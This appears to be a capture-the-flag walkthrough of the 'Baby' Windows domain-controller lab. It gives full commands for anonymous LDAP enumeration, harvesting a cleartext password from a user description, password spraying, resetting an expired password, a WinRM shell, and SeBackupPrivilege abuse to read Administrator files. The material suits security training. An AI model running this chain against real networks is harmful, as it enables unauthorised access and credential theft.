# Baby - Easy

```sh
sudo vim /etc/hosts
# add baby.htb

nmap -T4 -p- -A -Pn -v baby.htb
```

* open ports & services:

    * 53/tcp - domain - Simple DNS Plus
    * 88/tcp - kerberos-sec - Microsoft Windows Kerberos
    * 135/tcp - msrpc - Microsoft Windows RPC
    * 139/tcp - netbios-ssn - Microsoft Windows netbios-ssn
    * 389/tcp - ldap - Microsoft Windows Active Directory LDAP
    * 445/tcp - microsoft-ds
    * 464/tcp - kpasswd5
    * 593/tcp - ncacn_http - Microsoft Windows RPC over HTTP 1.0
    * 636/tcp - tcpwrapped
    * 3268/tcp - ldap - Microsoft Windows Active Directory LDAP
    * 3269/tcp - tcpwrapped
    * 3389/tcp - ms-wbt-server - Microsoft Terminal Services
    * 5985/tcp - http - Microsoft HTTPAPI httpd 2.0
    * 9389/tcp - mc-nmf - .NET Message Framing
    * 49664/tcp - msrpc - Microsoft Windows RPC
    * 49667/tcp - msrpc - Microsoft Windows RPC
    * 52326/tcp - ncacn_http - Microsoft Windows RPC over HTTP 1.0
    * 52327/tcp - msrpc - Microsoft Windows RPC
    * 52335/tcp - msrpc - Microsoft Windows RPC
    * 60391/tcp - msrpc - Microsoft Windows RPC
    * 60405/tcp - msrpc - Microsoft Windows RPC

* ```nmap``` scan gives a few domain names like 'baby.vl0' & 'baby.vl' - we can update the ```/etc/hosts``` entry with these domains

* ```nmap``` also shows the target is a DC machine 'BabyDC.baby.vl'

* enumerating RPC & SMB:

    ```sh
    rpcclient -U "" baby.htb
    # NT_STATUS_LOGON_FAILURE

    rpcinfo -p baby.htb
    # connection failed

    smbmap -H baby.htb
    # failed

    enum4linux-ng baby.htb -A
    # no useful info

    smbclient -N -L //baby.htb
    # no shares listed

    crackmapexec smb baby.htb --shares -u '' -p ''
    # STATUS_ACCESS_DENIED

    crackmapexec smb baby.htb --shares -u 'Guest' -p ''
    # STATUS_ACCOUNT_DISABLED
    ```

* for the service on port 9389, Googling shows that this port usually runs the Active Directory Web Services (ADWS) for remote management of AD

* this port does not give any info when interacted with ```nc```, so we can check this later, as this service seems to accept only authenticated requests

* enumerating LDAP:

    ```sh
    ldapsearch -x -H ldap://baby.htb -s base namingcontexts
    # -x for simple authentication
    # -H for LDAP URI
    # -s for scope - set to base

    # this gives us a few namingcontexts
    # we can use 'DC=baby,DC=vl'

    ldapsearch -x -H ldap://baby.htb -b 'DC=baby,DC=vl'
    # -b for search base
    ```

* the ```ldapsearch``` query gives us a lot of user & domain info - we can enumerate the complete infodump for any secrets

* we get the following info from this:

    * a group 'dev' exists with the following users:

        * Ian Walker
        * Leonard Dyer
        * Hugh George
        * Ashley Webb
        * Jacqueline Barnett
    
    * another group 'it' has the following users:

        * Caroline Robinson
        * Teresa Bell
        * Kerry Wilson
        * Joseph Hughes
        * Connor Wilkinson
    
    * the 'it' group is a member of 'Remote Management Users' group - so these users can login via RDP

    * the 'description' field for user 'Teresa Bell' gives the cleartext password 'BabyStart123!'

* using this password, we can attempt password spraying; as we do not know the format of usernames, we can use a tool like [namemash.py](https://gist.github.com/superkojiman/11076951) to generate usernames:

    ```sh
    vim names.txt
    # paste all names in 'FirstName LastName' format

    python3 namemash.py names.txt >> usernames.txt
    # generate usernames

    crackmapexec winrm baby.htb -u usernames.txt -p 'BabyStart123!' --continue-on-success
    # password spray for WinRM
    # no luck

    crackmapexec smb baby.htb -u usernames.txt -p 'BabyStart123!' --continue-on-success
    # password spray for SMB
    ```

* the password spraying for WinRM did not work; but password spraying for SMB gave the message 'STATUS_PASSWORD_MUST_CHANGE' for the creds 'baby.vl\caroline.robinson:BabyStart123!'

* as the password needs to be changed, we can use a tool like ```smbpasswd``` and change the user's password before we can login:

    ```sh
    smbpasswd -r baby.htb -U caroline.robinson
    # using the old password, we can create a new password like 'Pass123!'
    ```

* verify the new works for this user:

    ```sh
    crackmapexec smb baby.htb -u caroline.robinson -p 'Pass123!'
    # this works

    crackmapexec winrm baby.htb -u caroline.robinson -p 'Pass123!'
    # this works too
    ```

* as WinRM shows valid creds, we can login as 'caroline.robinson' now:

    ```ps
    evil-winrm -u caroline.robinson -p 'Pass123!' -i baby.htb
    # this works

    cd C:\Users\Caroline.Robinson\Desktop

    type user.txt
    # user flag

    dir C:\Users
    # no other users except for administrator

    whoami /priv
    # shows multiple privs enabled
    ```

* ```whoami /priv``` shows we have multiple privileges enabled; one of the enabled privileges is ```SeBackupPrivilege``` - [this privilege can be abused for privesc](https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/sebackupprivilege/):

    * [download the SeBackupPrivilege abuse DLLs - SeBackupPrivilegeCmdLets.dll & SeBackupPrivilegeUtils.dll](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)

    * upload the DLLs to target - as we are using ```evil-winrm``` shell, we can just use the 'upload' command:

        ```ps
        upload SeBackupPrivilegeCmdLets.dll

        upload SeBackupPrivilegeUtils.dll
        ```
    
    * import the malicious modules:

        ```ps
        Import-Module .\SeBackupPrivilegeUtils.dll

        Import-Module .\SeBackupPrivilegeCmdLets.dll

        Set-SeBackupPrivilege

        Get-SeBackupPrivilege
        ```
    
    * now we can access & read sensitive files like root flag:

        ```ps
        Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt C:\Users\Caroline.Robinson\root.txt -Overwrite

        type C:\Users\Caroline.Robinson\root.txt
        # root flag
        ```
